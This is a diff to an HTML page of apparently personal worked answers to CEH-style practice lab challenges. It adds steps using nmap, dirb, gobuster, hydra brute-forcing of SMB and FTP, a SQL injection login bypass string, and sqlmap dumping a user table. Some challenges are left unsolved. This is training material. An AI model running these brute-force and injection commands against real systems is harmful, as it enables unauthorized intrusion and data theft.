@@ -454,6 +454,7 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas</p>
     <p><ol>
         <ul>nmap --script smb-enum-shares -p445 192.168.10.101</ul>
         <ul>\\192.168.10.101\IPC$ has <b>Anonymous access: READ</b></ul>
+        <ul>smbclient -L //192.168.10.101 tells that authorization is needed</ul>
         <ul>cd /home/attacker/Desktop</ul>
         <ul>Brute force: <b>hydra -L username.txt -P password.txt 192.168.10.101 smb</b></ul>
         <ul>We find the credentials for <b>Martin</b>: <b>qwerty1234</b></ul>
@@ -463,4 +464,84 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas</p>
         <ul>www.moviescope.com is highlighted</ul>
         <ul>We visit the website www.moviescope.com and look at the source</ul>
         <ul>Answer to this question: Meta author is EC-Council</ul>
+    </ol></p>
+
+    <p>Challenge 9:</p>
+    <p>You have recently joined GoodShopping Inc. as a web application security administrator. Eager to understand the security landscape of the company’s website, www.goodshopping.com, 
+        you decide to investigate the security updates that have been made over time. Your specific task is to identify the attack category of the oldest Common Vulnerabilities and Exposures (CVEs) 
+        affected the website. (Format: aaaaa*aaaa aaaaaaaaaa (AAA) )</p>
+        <p>Answer:</p>
+        <p><ol>
+            <ul>read this: https://digistam.github.io/method/nmap_cve.html</ul>
+            <ul>nmap --script nmap-vulners/ -sV goodshopping.com</ul>
+            <ul>nmap --script vuln -sV goodshopping.com</ul>
+            <ul>not yet solved</ul>
+        </ol></p>
+
+    <p>Challenge 10:</p>
+    <p>You are a web penetration tester hired to assess the security of the website www.goodshopping.com. Your primary task is to identify the type of security policies is missing to detect and mitigate 
+        Cross-Site Scripting (XSS) and SQL Injection attacks. (Format: Aaaaaaa Aaaaaaaa Aaaaaa)</p>
+        <p>Answer:</p>
+        <p><ol>
+            <ul>Start OWASP ZAP en find alerts for goodshopping.com</ul>
+            <ul>Answer to this question: Content Security Policy</ul>
+        </ol></p>
+
+    <p>Challenge 11:</p>
+    <p>You are part of a cybersecurity team investigating an internal website that has been copied from a legitimate site without authorization. One of your teammates, acting as a spy, 
+        has scanned the website using a smart scanner within the subnet 192.168.10.0/24. Your task is to identify the number of Directory Listing of Sensitive Files on this website. The report, named w_report.pdf, 
+        is available on the target machine.(Hint: He remembered the OS as Windows Server 19 while scanning the website) (Format: NN)</p>
+        <p>Answer:</p>
+        <p><ol>
+            <ul>We have to use nmap to find the machine named Windows Server 19 in the subnet 192.68.10.0/24</ul>
+            <ul>Let's use Zenmap for this:</ul>
+            <ul>nmap -sn 192.168.10.0/24</ul>
+            <ul>192.168.10.1, 192.168.10.101, 192.168.10.111, 192.168.10.121, 192.168.10.144 and 192.168.10.222 are live</ul>
+            <ul>nmap -sV -T4 -A 192.68.10.1</ul>
+            <ul>nmap -sV -T4 -A 192.68.10.101</ul>
+            <ul>etc.</ul>
+            <ul>192.168.10.144 is a Windows 19 system</ul>
+            <ul>nmap -sV --script http-enum 192.168.10.144</ul>
+            <ul>dirb http://192.168.10.144 -w /usr/share/wordlists/dirb/big.txt</ul>
+            <ul>Folder http://192.168.10.144/aspnet_client found</ul>
+            <ul>gobuster dir -u http://192.168.10.144 -w /usr/share/wordlists/dirb/big.txt</ul>
+            <ul>Gobuster finds /aspnet_client as well as /rpc</ul>
+            <ul>Hydra to the rescue !</ul>
+            <ul>hydra -L username.txt -P password.txt 192.168.10.144 ftp</ul>
+            <ul>Username Parker and password Passw0rd@1234 is retrieved</ul>
+            <ul>Logging in with FTP and this credential leads to finding the report w_report.pdf</ul>
+            <ul>get w_report.pdf</ul>
+            <ul>Open the pdf file with Open Office writer and search for directory listing of sensitive files</ul>
+            <ul>36 files are mentioned in the report</ul>
+        </ol></p>
+
+    <p>Challenge 12:</p>
+    <p>Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)</p>
+    <p>Answer:</p>
+    <p><ol>
+        <ul>nmap -sV -T4 -A cehorg.com</ul>
+        <ul>not yet solved</ul>
+    </ol></p>
+
+    <p>Challenge 13:</p>
+    <p>As a cybersecurity analyst, your task is to identify potential vulnerabilities on the moviescope.com website. Your manager has requested a 
+        specific number of risk categories. The required HTML file is located on EH Workstation 1. (Format: N)</p>
+        <p>Answer:</p>
+        <p><ol>
+            <ul>EH Workstation 1 > Folder Videos > file www.moviescope.com_xxx</ul>
+            <ul>The report file mentions 3 vulnerabilities</ul>
+        </ol></p>
+
+    <p>Challenge 14:</p>
+    <p>Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. (Format: N)</p>
+    <p>Answer:</p>
+    <p><ol>
+        <ul>Start Burp Suite</ul>
+        <ul>use the Burp Suite browser to log in at www.moviescope.com using a username and password bla' OR '1'='1' --</ul>
+        <ul>after login use Burp Suite to copy a cookie</ul>
+        <ul>start sqlmap</ul>
+        <ul>sqlmap http://www.moviescope.com/viewprofile.aspx?id=1 --cookie "mscope=xxxxx=; ui-tabs-1=0"</ul>
+        <ul>as soon as you found out the right dbase name and table name:</ul>
+        <ul>sqlmap http://www.moviescope.com/viewprofile.aspx?id=1 --cookie "mscope=xxxxx=; ui-tabs-1=0" -D moviescope -t User_Profile --dump</ul>
+        <ul>You can see there are 5 users in the database</ul>
     </ol></p>
